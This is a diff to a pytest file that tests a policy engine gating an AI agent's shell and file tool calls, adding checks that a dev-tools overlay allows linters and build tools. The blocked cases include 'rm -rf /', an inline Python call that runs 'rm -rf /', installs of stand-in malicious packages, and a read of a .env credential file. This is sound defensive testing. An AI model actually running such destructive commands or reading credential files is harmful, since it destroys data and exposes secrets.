@@ -6,9 +6,11 @@ from pathlib import Path
 import pytest
 
 from tether.core.safety.policy import PolicyDecision, PolicyEngine
-from tether.plugins.builtin.browser_tools import (ALL_BROWSER_TOOLS,
-                                                  BROWSER_MUTATION_TOOLS,
-                                                  BROWSER_READONLY_TOOLS)
+from tether.plugins.builtin.browser_tools import (
+    ALL_BROWSER_TOOLS,
+    BROWSER_MUTATION_TOOLS,
+    BROWSER_READONLY_TOOLS,
+)
 
 
 @pytest.fixture
@@ -492,6 +494,175 @@ class TestPolicyBypassAttacks:
         # match because "rm" is preceded by "`echo " — verify it isn't ALLOW
         decision = engine.evaluate(c)
         assert decision != PolicyDecision.ALLOW
+
+
+class TestDevToolsOverlay:
+    """dev-tools.yaml overlay allows safe dev commands, blocks dangerous ones."""
+
+    @pytest.fixture
+    def dev_overlay_engine(self):
+        policies_dir = Path(__file__).parent.parent / "tether" / "policies"
+        return PolicyEngine(
+            [policies_dir / "default.yaml", policies_dir / "dev-tools.yaml"]
+        )
+
+    @pytest.mark.parametrize(
+        ("command", "rule_name"),
+        [
+            # dev-linters — standalone tools
+            ("pytest tests/ -v", "dev-linters"),
+            ("pytest --cov=src tests/", "dev-linters"),
+            ("ruff check .", "dev-linters"),
+            ("ruff format --check src/", "dev-linters"),
+            ("jest --watch", "dev-linters"),
+            ("vitest run", "dev-linters"),
+            ("mypy src/", "dev-linters"),
+            ("black --check .", "dev-linters"),
+            ("flake8 src/", "dev-linters"),
+            ("eslint src/", "dev-linters"),
+            ("prettier --write .", "dev-linters"),
+            # dev-build-tools — npm
+            ("npm install express", "dev-build-tools"),
+            ("npm ci", "dev-build-tools"),
+            ("npm test", "dev-build-tools"),
+            ("npm run build", "dev-build-tools"),
+            ("npm ls", "dev-build-tools"),
+            ("npm audit", "dev-build-tools"),
+            # dev-build-tools — yarn/pnpm/bun
+            ("yarn install", "dev-build-tools"),
+            ("pnpm add lodash", "dev-build-tools"),
+            ("bun install", "dev-build-tools"),
+            # dev-build-tools — pip
+            ("pip install requests", "dev-build-tools"),
+            ("pip list", "dev-build-tools"),
+            ("pip freeze", "dev-build-tools"),
+            # dev-build-tools — uv safe subcommands
+            ("uv sync", "dev-build-tools"),
+            ("uv lock", "dev-build-tools"),
+            ("uv add httpx", "dev-build-tools"),
+            ("uv pip install requests", "dev-build-tools"),
+            # dev-build-tools — uv run with known-safe runners
+            ("uv run pytest tests/ -v", "dev-build-tools"),
+            ("uv run ruff check .", "dev-build-tools"),
+            ("uv run mypy src/", "dev-build-tools"),
+            # dev-build-tools — cargo
+            ("cargo build", "dev-build-tools"),
+            ("cargo test", "dev-build-tools"),
+            ("cargo clippy", "dev-build-tools"),
+            ("cargo fmt", "dev-build-tools"),
+            # dev-build-tools — go
+            ("go build ./...", "dev-build-tools"),
+            ("go test ./...", "dev-build-tools"),
+            ("go vet ./...", "dev-build-tools"),
+            ("go mod tidy", "dev-build-tools"),
+            # dev-build-tools — make
+            ("make test", "dev-build-tools"),
+            ("make check", "dev-build-tools"),
+            ("make lint", "dev-build-tools"),
+            ("make build", "dev-build-tools"),
+            ("make clean", "dev-build-tools"),
+            ("make install", "dev-build-tools"),
+        ],
+    )
+    def test_safe_commands_allowed(self, dev_overlay_engine, command, rule_name):
+        c = dev_overlay_engine.classify("Bash", {"command": command})
+        assert dev_overlay_engine.evaluate(c) == PolicyDecision.ALLOW
+        assert c.matched_rule.name == rule_name
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm publish",
+            "npm exec -- malicious-pkg",
+            "yarn publish",
+            "cargo publish",
+            "cargo install malicious-crate",
+            "go run malicious.go",
+            "go install example.com/evil@latest",
+            "go get example.com/evil",
+            "uv run script.py",
+            "uv run python -c 'import os; os.system(\"rm -rf /\")'",
+            "make deploy",
+            "make release",
+            "make push",
+        ],
+    )
+    def test_dangerous_commands_not_allowed(self, dev_overlay_engine, command):
+        c = dev_overlay_engine.classify("Bash", {"command": command})
+        assert dev_overlay_engine.evaluate(c) != PolicyDecision.ALLOW
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uv run pytest tests/ -v",
+            "make check",
+            "uv run ruff check .",
+            "npm install express",
+            "cargo build",
+            "go test ./...",
+        ],
+    )
+    def test_dev_commands_require_approval_without_overlay(self, engine, command):
+        c = engine.classify("Bash", {"command": command})
+        assert engine.evaluate(c) == PolicyDecision.REQUIRE_APPROVAL
+
+    def test_overlay_does_not_bypass_deny_rules(self, dev_overlay_engine):
+        c = dev_overlay_engine.classify("Bash", {"command": "rm -rf /"})
+        assert dev_overlay_engine.evaluate(c) == PolicyDecision.DENY
+
+    def test_overlay_preserves_credential_deny(self, dev_overlay_engine):
+        c = dev_overlay_engine.classify("Read", {"file_path": "/home/user/.env"})
+        assert dev_overlay_engine.evaluate(c) == PolicyDecision.DENY
+
+
+class TestDevToolsRegexBoundaries:
+    """Verify regex anchors and word boundaries in dev-tools.yaml patterns."""
+
+    @pytest.fixture
+    def dev_overlay_engine(self):
+        policies_dir = Path(__file__).parent.parent / "tether" / "policies"
+        return PolicyEngine(
+            [policies_dir / "default.yaml", policies_dir / "dev-tools.yaml"]
+        )
+
+    def test_bare_command_without_args(self, dev_overlay_engine):
+        """Bare 'pytest' with no arguments should match dev-linters."""
+        c = dev_overlay_engine.classify("Bash", {"command": "pytest"})
+        assert dev_overlay_engine.evaluate(c) == PolicyDecision.ALLOW
+        assert c.matched_rule.name == "dev-linters"
+
+    def test_command_with_leading_path_does_not_match(self, dev_overlay_engine):
+        """/usr/bin/pytest should NOT match (patterns anchor with ^)."""
+        c = dev_overlay_engine.classify("Bash", {"command": "/usr/bin/pytest tests/"})
+        # Should NOT match dev-linters or dev-build-tools
+        assert c.matched_rule is None or c.matched_rule.name not in (
+            "dev-linters",
+            "dev-build-tools",
+        )
+
+    def test_case_sensitivity(self, dev_overlay_engine):
+        """Uppercase 'Pytest' should not match ^pytest (regex is case-sensitive)."""
+        c = dev_overlay_engine.classify("Bash", {"command": "Pytest tests/"})
+        assert c.matched_rule is None or c.matched_rule.name not in (
+            "dev-linters",
+            "dev-build-tools",
+        )
+
+    def test_double_whitespace_matches(self, dev_overlay_engine):
+        r"""'npm  install' (double space) should match since pattern uses \s+."""
+        c = dev_overlay_engine.classify("Bash", {"command": "npm  install express"})
+        assert dev_overlay_engine.evaluate(c) == PolicyDecision.ALLOW
+        assert c.matched_rule.name == "dev-build-tools"
+
+    def test_partial_command_name_does_not_match(self, dev_overlay_engine):
+        """'my-pytest tests/' should not match dev-linters."""
+        c = dev_overlay_engine.classify("Bash", {"command": "my-pytest tests/"})
+        assert c.matched_rule is None or c.matched_rule.name != "dev-linters"
+
+    def test_trailing_text_after_word_boundary(self, dev_overlay_engine):
+        """'pytesting' should not match due to \b word boundary."""
+        c = dev_overlay_engine.classify("Bash", {"command": "pytesting tests/"})
+        assert c.matched_rule is None or c.matched_rule.name != "dev-linters"
 
 
 class TestGitRmPolicyClassification:
